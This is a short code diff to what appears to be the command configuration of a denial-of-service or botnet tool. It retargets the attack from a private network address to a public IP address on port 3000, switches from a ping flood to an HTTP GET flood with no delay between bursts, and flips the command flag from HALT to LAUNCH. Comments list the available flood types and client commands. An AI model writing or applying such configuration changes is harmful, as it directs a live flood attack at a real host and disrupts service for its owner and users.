@@ -1,4 +1,4 @@
-ATTACK_TARGET_HOST = "192.168.0.105" # IP address of the machine to be attacked.
+ATTACK_TARGET_HOST = "167.172.229.50" # IP address of the machine to be attacked.
 ATTACK_TARGET_PORT = "3000" # Port Number of the machine to be attacked.
 
 #################################################################################
@@ -7,7 +7,7 @@ ATTACK_TARGET_PORT = "3000" # Port Number of the machine to be attacked.
 	#HTTPFLOOD - Floods the target system with GET requests. (PORT and DELAY parameters required)
 	#PINGFLOOD - Floods the target system with ICMP echo requests. (PORT AND DELAY parameters not required)
 
-ATTACK_TYPE = "PINGFLOOD"
+ATTACK_TYPE = "HTTPFLOOD"
 
 # Number of seconds delay between the burst of requests. 0 for No Delay
 ATTACK_BURST_SECONDS = "0" 
@@ -20,7 +20,7 @@ ATTACK_BURST_SECONDS = "0"
 	# HOLD - Wait for command.
 	# UPDATE - Update Client.
 
-ATTACK_CODE = "HALT" # Choose any one Flag from above
+ATTACK_CODE = "LAUNCH" # Choose any one Flag from above
 
 #################################################################################
 
